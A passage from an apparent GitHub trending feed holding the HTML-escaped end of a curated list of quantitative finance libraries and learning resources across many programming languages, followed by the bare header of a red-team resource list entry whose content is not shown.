href=&#34;https://cran.r-project.org/web/packages/sde/index.html&#34;&gt;sde&lt;/a&gt; - Simulation and Inference for Stochastic Differential Equations.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/YieldCurve/index.html&#34;&gt;YieldCurve&lt;/a&gt; - Modelling and estimation of the yield curve.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/SmithWilsonYieldCurve/index.html&#34;&gt;SmithWilsonYieldCurve&lt;/a&gt; - Constructs a yield curve by the Smith-Wilson method from a table of LIBOR and SWAP rates.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/ycinterextra/index.html&#34;&gt;ycinterextra&lt;/a&gt; - Yield curve or zero-coupon prices interpolation and extrapolation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/AmericanCallOpt/index.html&#34;&gt;AmericanCallOpt&lt;/a&gt; - This package includes pricing function for selected American call options with underlying assets that generate payouts.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/VarSwapPrice/index.html&#34;&gt;VarSwapPrice&lt;/a&gt; - Pricing a variance swap on an equity index.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/RND/index.html&#34;&gt;RND&lt;/a&gt; - Risk Neutral Density Extraction Package.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/LSMonteCarlo/index.html&#34;&gt;LSMonteCarlo&lt;/a&gt; - American options pricing with Least Squares Monte Carlo method.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/OptHedging/index.html&#34;&gt;OptHedging&lt;/a&gt; - Estimation of value and hedging strategy of call and put options.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/tvm/index.html&#34;&gt;tvm&lt;/a&gt; - Time Value of Money Functions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/OptionPricing/index.html&#34;&gt;OptionPricing&lt;/a&gt; - Option Pricing with Efficient Simulation Algorithms.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/blenezet/credule&#34;&gt;credule&lt;/a&gt; - Credit Default Swap Functions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/derivmkts/index.html&#34;&gt;derivmkts&lt;/a&gt; - Functions and R Code to Accompany Derivatives Markets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/felixfan/FinCal&#34;&gt;FinCal&lt;/a&gt; - Package for time value of money calculation, time series analysis and computational finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/artyyouth/r-quant&#34;&gt;r-quant&lt;/a&gt; - R code for quantitative analysis in finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/taylorizing/options.studies&#34;&gt;options.studies&lt;/a&gt; - options trading studies functions for use with options.data package and shiny.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/braverock/PortfolioAnalytics&#34;&gt;PortfolioAnalytics&lt;/a&gt; - Portfolio Analysis, Including Numerical Methods for Optimizationof Portfolios.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/imanuelcostigan/fmbasics&#34;&gt;fmbasics&lt;/a&gt; - Financial Market Building Blocks.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/wilsonfreitas/R-fixedincome&#34;&gt;R-fixedincome&lt;/a&gt; - Fixed income tools for R.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Trading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/backtest/index.html&#34;&gt;backtest&lt;/a&gt; - Exploring Portfolio-Based Conjectures About Financial Instruments.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/pa/index.html&#34;&gt;pa&lt;/a&gt; - Performance Attribution for Equity Portfolios.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/joshuaulrich/TTR&#34;&gt;TTR&lt;/a&gt; - Technical Trading Rules.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://quanttools.bitbucket.io/_site/index.html&#34;&gt;QuantTools&lt;/a&gt; - Enhanced Quantitative Trading Modelling.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/braverock/blotter&#34;&gt;blotter&lt;/a&gt; - Transaction infrastructure for defining instruments, transactions, portfolios and accounts for trading systems and simulation. Provides portfolio support for multi-asset class and multi-currency portfolios. Actively maintained and developed.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Backtesting&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/braverock/quantstrat&#34;&gt;quantstrat&lt;/a&gt; - Transaction-oriented infrastructure for constructing trading systems and simulation. Provides support for multi-asset class and multi-currency portfolios for backtesting and other financial research.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Risk Analysis&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/braverock/PerformanceAnalytics&#34;&gt;PerformanceAnalytics&lt;/a&gt; - Econometric tools for performance and risk analysis.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Factor Analysis&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/braverock/FactorAnalytics&#34;&gt;FactorAnalytics&lt;/a&gt; - The FactorAnalytics package contains fitting and analysis methods for the three main types of factor models used in conjunction with portfolio construction, optimization and risk management, namely fundamental factor models, time series factor models and statistical factor models.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JustinMShea/ExpectedReturns&#34;&gt;Expected Returns&lt;/a&gt; - Solutions for enhancing portfolio diversification and replications of seminal papers with R, most of which are discussed in one of the best investment references of the recent decade, Expected Returns: An Investors Guide to Harvesting Market Rewards by Antti Ilmanen.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Time Series&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/tseries/index.html&#34;&gt;tseries&lt;/a&gt; - Time Series Analysis and Computational Finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/fGarch/index.html&#34;&gt;fGarch&lt;/a&gt; - Rmetrics - Autoregressive Conditional Heteroskedastic Modelling.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/timeSeries/index.html&#34;&gt;timeSeries&lt;/a&gt; - Rmetrics - Financial Time Series Objects.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alexiosg/rugarch&#34;&gt;rugarch&lt;/a&gt; - Univariate GARCH Models.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alexiosg/rmgarch&#34;&gt;rmgarch&lt;/a&gt; - Multivariate GARCH Models.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/edgararuiz/tidypredict&#34;&gt;tidypredict&lt;/a&gt; - Run predictions inside the database &lt;a href=&#34;https://tidypredict.netlify.com/&#34;&gt;https://tidypredict.netlify.com/&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/business-science/tidyquant&#34;&gt;tidyquant&lt;/a&gt; - Bringing financial analysis to the tidyverse.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/business-science/timetk&#34;&gt;timetk&lt;/a&gt; - A toolkit for working with time series in R.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/business-science/tibbletime&#34;&gt;tibbletime&lt;/a&gt; - Built on top of the tidyverse, tibbletime is an extension that allows for the creation of time aware tibbles through the setting of a time index.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/matrix-profile-foundation/matrixprofile&#34;&gt;matrixprofile&lt;/a&gt; - Time series data mining library built on top of the novel Matrix Profile data structure and algorithms.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/AlbertoAlmuinha/garchmodels&#34;&gt;garchmodels&lt;/a&gt; - A parsnip backend for GARCH models.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Calendars&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cran.r-project.org/web/packages/timeDate/index.html&#34;&gt;timeDate&lt;/a&gt; - Chronological and Calendar Objects&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/wilsonfreitas/R-bizdays&#34;&gt;bizdays&lt;/a&gt; - Business days calculations and utilities&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Matlab&lt;/h2&gt; &#xA;&lt;h3&gt;FrameWorks&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yutiansut/quantaxis&#34;&gt;QUANTAXIS&lt;/a&gt; - Integrated Quantitative Toolbox with Matlab.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Julia&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/pazzo83/QuantLib.jl&#34;&gt;QuantLib.jl&lt;/a&gt; - Quantlib implementation in pure Julia.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/aviks/Ito.jl&#34;&gt;Ito.jl&lt;/a&gt; - A Julia package for quantitative finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/femtotrader/TALib.jl&#34;&gt;TALib.jl&lt;/a&gt; - A Julia wrapper for TA-Lib.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JuliaComputing/Miletus.jl&#34;&gt;Miletus.jl&lt;/a&gt; - A financial contract definition, modeling language, and valuation framework.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dysonance/Temporal.jl&#34;&gt;Temporal.jl&lt;/a&gt; - Flexible and efficient time series class &amp;amp; methods.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dysonance/Indicators.jl&#34;&gt;Indicators.jl&lt;/a&gt; - Financial market technical analysis &amp;amp; indicators on top of Temporal.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dysonance/Strategems.jl&#34;&gt;Strategems.jl&lt;/a&gt; - Quantitative systematic trading strategy development and backtesting.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JuliaStats/TimeSeries.jl&#34;&gt;TimeSeries.jl&lt;/a&gt; - Time series toolkit for Julia.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JuliaQuant/MarketTechnicals.jl&#34;&gt;MarketTechnicals.jl&lt;/a&gt; - Technical analysis of financial time series on top of TimeSeries.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JuliaQuant/MarketData.jl&#34;&gt;MarketData.jl&lt;/a&gt; - Time series market data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/femtotrader/TimeFrames.jl&#34;&gt;TimeFrames.jl&lt;/a&gt; - A Julia library that defines TimeFrame (essentially for resampling TimeSeries).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Java&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://strata.opengamma.io/&#34;&gt;Strata&lt;/a&gt; - Modern open-source analytics and market risk library designed and written in Java.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.jquantlib.org&#34;&gt;JQuantLib&lt;/a&gt; - JQuantLib is a free, open-source, comprehensive framework for quantitative finance, written in 100% Java.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://finmath.net&#34;&gt;finmath.net&lt;/a&gt; - Java library with algorithms and methodologies related to mathematical finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/lsgro/quantcomponents&#34;&gt;quantcomponents&lt;/a&gt; - Free Java components for Quantitative Finance and Algorithmic Trading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://lakshmidrip.github.io/DRIP&#34;&gt;DRIP&lt;/a&gt; - Fixed Income, Asset Allocation, Transaction Cost Analysis, XVA Metrics Libraries.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ta4j/ta4j&#34;&gt;ta4j&lt;/a&gt; - A Java library for technical analysis.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;JavaScript&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ebradyjobory/finance.js&#34;&gt;finance.js&lt;/a&gt; - A JavaScript library for common financial calculations.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/lequant40/portfolio_allocation_js&#34;&gt;portfolio-allocation&lt;/a&gt; - PortfolioAllocation is a JavaScript library designed to help constructing financial portfolios made of several assets: bonds, commodities, cryptocurrencies, currencies, exchange traded funds (ETFs), mutual funds, stocks...&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ghostfolio/ghostfolio&#34;&gt;Ghostfolio&lt;/a&gt; - Wealth management software to keep track of financial assets like stocks, ETFs or cryptocurrencies and make solid, data-driven investment decisions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cinar/indicatorts&#34;&gt;IndicatorTS&lt;/a&gt; - Indicator is a TypeScript module providing various stock technical analysis indicators, strategies, and a backtest framework for trading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ccxt/ccxt&#34;&gt;ccxt&lt;/a&gt; - A JavaScript / Python / PHP cryptocurrency trading API with support for more than 100 bitcoin/altcoin exchanges.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Data Visualization&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yutiansut/QUANTAXIS_Webkit&#34;&gt;QUANTAXIS_Webkit&lt;/a&gt; - An awesome visualization center based on quantaxis.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Haskell&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/boundedvariation/quantfin&#34;&gt;quantfin&lt;/a&gt; - quant finance in pure haskell.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/co-category/hqfl&#34;&gt;hqfl&lt;/a&gt; - Haskell Quantitative Finance Library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/MarcusRainbow/Haxcel&#34;&gt;Haxcel&lt;/a&gt; - Excel Addin for Haskell.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/MarcusRainbow/Ffinar&#34;&gt;Ffinar&lt;/a&gt; - A financial maths library in Haskell.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Scala&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/choucrifahed/quantscale&#34;&gt;QuantScale&lt;/a&gt; - Scala Quantitative Finance Library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frankcash/Scala-Quant&#34;&gt;Scala Quant&lt;/a&gt; - Scala library for working with stock data from IFTTT recipes or Google Finance.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Ruby&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/unageanu/jiji2&#34;&gt;Jiji&lt;/a&gt; - Open Source Forex algorithmic trading framework using OANDA REST API.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Elixir/Erlang&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/fremantle-capital/tai&#34;&gt;Tai&lt;/a&gt; - Open Source composable, real time, market data and trade execution toolkit.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/fremantle-industries/workbench&#34;&gt;Workbench&lt;/a&gt; - From Idea to Execution - Manage your trading operation across a globally distributed cluster&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/fremantle-industries/prop&#34;&gt;Prop&lt;/a&gt; - An open and opinionated trading platform using productive &amp;amp; familiar open source libraries and tools for strategy research, execution and operation.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Golang&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/stellar/kelp&#34;&gt;Kelp&lt;/a&gt; - Kelp is an open-source Golang algorithmic cryptocurrency trading bot that runs on centralized exchanges and Stellar DEX (command-line usage and desktop GUI).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alpacahq/marketstore&#34;&gt;marketstore&lt;/a&gt; - DataFrame Server for Financial Timeseries Data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cinar/indicator&#34;&gt;IndicatorGo&lt;/a&gt; - IndicatorGo is a Golang module providing various stock technical analysis indicators, strategies, and a backtest framework for trading.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;CPP&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rburkholder/trade-frame&#34;&gt;TradeFrame&lt;/a&gt; - C++ 17 based framework/library (with sample applications) for testing options based automated trading ideas using DTN IQ real time data feed and Interactive Brokers (TWS API) for trade execution. Comes with built-in &lt;a href=&#34;https://github.com/rburkholder/trade-frame/tree/master/lib/TFOptions&#34;&gt;Option Greeks/IV&lt;/a&gt; calculation library.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Frameworks&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.quantlib.org&#34;&gt;QuantLib&lt;/a&gt; - The QuantLib project is aimed at providing a comprehensive software framework for quantitative finance. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://www.jquantlib.org&#34;&gt;JQuantLib&lt;/a&gt; - Java port.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;http://dirk.eddelbuettel.com/code/rquantlib.html&#34;&gt;RQuantLib&lt;/a&gt; - R port.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.quantlib.org/quantlibaddin/&#34;&gt;QuantLibAddin&lt;/a&gt; - Excel support.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.quantlib.org/quantlibxl/&#34;&gt;QuantLibXL&lt;/a&gt; - Excel support.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/amaggiulli/qlnet&#34;&gt;QLNet&lt;/a&gt; - .Net port.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/enthought/pyql&#34;&gt;PyQL&lt;/a&gt; - Python port.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/pazzo83/QuantLib.jl&#34;&gt;QuantLib.jl&lt;/a&gt; - Julia port.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ta-lib.org&#34;&gt;TA-Lib&lt;/a&gt; - perform technical analysis of financial market data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://portfoliooptimizer.io/&#34;&gt;Portfolio Optimizer&lt;/a&gt; - Portfolio Optimizer is a Web API for portfolio analysis and optimization.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;CSharp&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/QuantConnect/Lean&#34;&gt;QuantConnect&lt;/a&gt; - Lean Engine is an open-source fully managed C# algorithmic trading engine built for desktop and cloud usage.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/StockSharp/StockSharp&#34;&gt;StockSharp&lt;/a&gt; - Algorithmic trading and quantitative trading open source platform to develop trading robots (stock markets, forex, crypto, bitcoins, and options).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/NVentimiglia/TDAmeritrade.DotNetCore&#34;&gt;TDAmeritrade.DotNetCore&lt;/a&gt; - Free, open-source .NET Client for the TD Ameritrade Trading Platform. Helps developers integrate TD Ameritrade API into custom trading solutions.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Rust&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/MarcusRainbow/QuantMath&#34;&gt;QuantMath&lt;/a&gt; - Financial maths library for risk-neutral pricing and risk&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Reproducing Works, Training &amp;amp; Books&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/MarcosCarreira/DermanPapers&#34;&gt;Derman Papers&lt;/a&gt; - Notebooks that replicate original quantitative finance papers from Emanuel Derman.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ml-quant.com/&#34;&gt;ML-Quant&lt;/a&gt; - Top Quant resources like ArXiv (sanity), SSRN, RePec, Journals, Podcasts, Videos, and Blogs.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jasonstrimpel/volatility-trading&#34;&gt;volatility-trading&lt;/a&gt; - A complete set of volatility estimators based on Euan Sinclair&#39;s Volatility Trading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/paulperry/quant&#34;&gt;quant&lt;/a&gt; - Quantitative Finance and Algorithmic Trading exhaust; mostly ipython notebooks based on Quantopian, Zipline, or Pandas.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rsvp/fecon235&#34;&gt;fecon235&lt;/a&gt; - Open source project for software tools in financial economics. Many jupyter notebook to verify theoretical ideas and practical methods interactively.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/LongOnly/Quantitative-Notebooks&#34;&gt;Quantitative-Notebooks&lt;/a&gt; - Educational notebooks on quantitative finance, algorithmic trading, financial modelling and investment strategy&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://quantecon.org/&#34;&gt;QuantEcon&lt;/a&gt; - Lecture series on economics, finance, econometrics and data science; QuantEcon.py, QuantEcon.jl, notebooks&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Finance-Hub/FinanceHub&#34;&gt;FinanceHub&lt;/a&gt; - Resources for Quantitative Finance&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dedwards25/Python_Option_Pricing&#34;&gt;Python_Option_Pricing&lt;/a&gt; - An libary to price financial options written in Python. Includes: Black Scholes, Black 76, Implied Volatility, American, European, Asian, Spread Options.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jpmorganchase/python-training&#34;&gt;python-training&lt;/a&gt; - J.P. Morgan&#39;s Python training for business analysts and traders.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/LastAncientOne/Stock_Analysis_For_Quant&#34;&gt;Stock_Analysis_For_Quant&lt;/a&gt; - Different Types of Stock Analysis in Excel, Matlab, Power BI, Python, R, and Tableau.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/chrisconlan/algorithmic-trading-with-python&#34;&gt;algorithmic-trading-with-python&lt;/a&gt; - Source code for Algorithmic Trading with Python (2020) by Chris Conlan.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cerlymarco/MEDIUM_NoteBook&#34;&gt;MEDIUM_NoteBook&lt;/a&gt; - Repository containing notebooks of &lt;a href=&#34;https://github.com/cerlymarco&#34;&gt;cerlymarco&lt;/a&gt;&#39;s posts on Medium.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PythonCharmers/QuantFinance&#34;&gt;QuantFinance&lt;/a&gt; - Training materials in quantitative finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Poseyy/MarketAnalysis&#34;&gt;MarketAnalysis&lt;/a&gt; - Implementing many different methods and popular analysis tools in Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mgroncki/IPythonScripts&#34;&gt;IPythonScripts&lt;/a&gt; - Tutorials about Quantitative Finance in Python and QuantLib: Pricing, xVAs, Hedging, Portfolio Optimisation, Machine Learning and Deep Learning.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/LechGrzelak/Computational-Finance-Course&#34;&gt;Computational-Finance-Course&lt;/a&gt; - Materials for the course of Computational Finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/emoen/Machine-Learning-for-Asset-Managers&#34;&gt;Machine-Learning-for-Asset-Managers&lt;/a&gt; - Implementation of code snippets, exercises and application to live data from Machine Learning for Asset Managers (Elements in Quantitative Finance) written by Prof. Marcos López de Prado.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/PacktPublishing/Python-for-Finance-Cookbook&#34;&gt;Python-for-Finance-Cookbook&lt;/a&gt; - Python for Finance Cookbook, published by Packt.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ysaporito/modelos_vol_derivativos&#34;&gt;modelos_vol_derivativos&lt;/a&gt; - &#34;Modelos de Volatilidade para Derivativos&#34; book&#39;s Jupyter notebooks&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/enricoschumann/NMOF&#34;&gt;NMOF&lt;/a&gt; - Functions, examples and data from the first and the second edition of &#34;Numerical Methods and Optimization in Finance&#34; by M. Gilli, D. Maringer and E. Schumann (2019, ISBN:978-0128150658).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yhilpisch/py4fi2nd&#34;&gt;py4fi2nd&lt;/a&gt; - Jupyter Notebooks and code for Python for Finance (2nd ed., O&#39;Reilly) by Yves Hilpisch.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yhilpisch/aiif&#34;&gt;aiif&lt;/a&gt; - Jupyter Notebooks and code for the book Artificial Intelligence in Finance (O&#39;Reilly) by Yves Hilpisch.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yhilpisch/py4at&#34;&gt;py4at&lt;/a&gt; - Jupyter Notebooks and code for the book Python for Algorithmic Trading (O&#39;Reilly) by Yves Hilpisch.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yhilpisch/dawp&#34;&gt;dawp&lt;/a&gt; - Jupyter Notebooks and code for Derivatives Analytics with Python (Wiley Finance) by Yves Hilpisch.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yhilpisch/dx&#34;&gt;dx&lt;/a&gt; - DX Analytics | Financial and Derivatives Analytics with Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/LechGrzelak/QuantFinanceBook&#34;&gt;QuantFinanceBook&lt;/a&gt; - Quantitative Finance book.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ryanmccrickerd/rough_bergomi&#34;&gt;rough_bergomi&lt;/a&gt; - A Python implementation of the rough Bergomi model.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ryanmccrickerd/frh-fx&#34;&gt;frh-fx&lt;/a&gt; - A python implementation of the fast-reversion Heston model of Mechkov for FX purposes.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/euclidjda/value-investing-studies&#34;&gt;value-investing-studies&lt;/a&gt; - A collection of data analysis studies that examine the performance and characteristics of value investing over long periods of time.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/firmai/machine-learning-asset-management&#34;&gt;machine-learning-asset-management&lt;/a&gt; - Machine Learning in Asset Management (by @firmai).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/LastAncientOne/Deep-Learning-Machine-Learning-Stock&#34;&gt;Deep-Learning-Machine-Learning-Stock&lt;/a&gt; - Deep Learning and Machine Learning stocks represent a promising long-term or short-term opportunity for investors and traders.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>Threekiii/Awesome-Redteam</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/Threekiii/Awesome-Redteam</id>
